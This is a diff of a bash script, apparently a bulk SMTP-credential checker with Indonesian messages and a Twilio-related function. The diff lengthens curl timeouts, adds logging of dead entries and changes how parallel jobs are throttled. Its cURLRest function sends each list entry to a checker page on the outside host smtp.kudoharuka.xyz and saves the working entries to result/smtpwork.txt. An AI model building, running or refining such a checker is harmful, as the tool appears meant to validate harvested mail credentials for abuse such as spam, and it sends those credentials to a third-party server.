@@ -53,15 +53,16 @@ TwilioREsulT(){
 	fi	
 }
 cURLRest(){
-	gET=$(curl -skL --connect-timeout 15 --max-time 15 "http://smtp.kudoharuka.xyz/smtp-checker.php?o=$1&emailto=$2" -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: id,en-US;q=0.7,en;q=0.3' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'TE: Trailers' -L)
+	gET=$(curl -skL --connect-timeout 20 --max-time 20 "http://smtp.kudoharuka.xyz/smtp-checker.php?o=$1&emailto=$2" -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: id,en-US;q=0.7,en;q=0.3' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'TE: Trailers' -L)
 }
 ReSult(){
 	cURLRest $1 $2
 	if [[ $gET =~ "Terkirim" ]]; then
-		printf "${labelijo}-- SEND SUKSES --${normal} ${bold} ${1}\n"
+		echo -e "${labelijo}-- SEND SUKSES --${normal} ${bold} ${1}"
 		echo "WORKED => $1">>result/smtpwork.txt
 	else
-		printf "${labelmerah}-- SEND ERROR --${normal} ${bold} ${1}\n"
+		echo -e "${labelmerah}-- SEND ERROR --${normal} ${bold} ${1}"
+		echo "DEAD => $1">>result/smtpdead.txt
 	fi
 
 }
@@ -199,7 +200,7 @@ elif [ $pilihan -eq "2" ]; then
 		AMPAS="${list[$i]}"
 		IFS='' read -r -a array <<< "$AMPAS"
 		target=${array[0]}
-		((cthread=cthread%2)); ((cthread++==0)) && wait
+		((cthread=cthread%1)); ((cthread++==0)) && wait
 		ProSeSS ${target} ${kirimke} &
 	done
 	wait
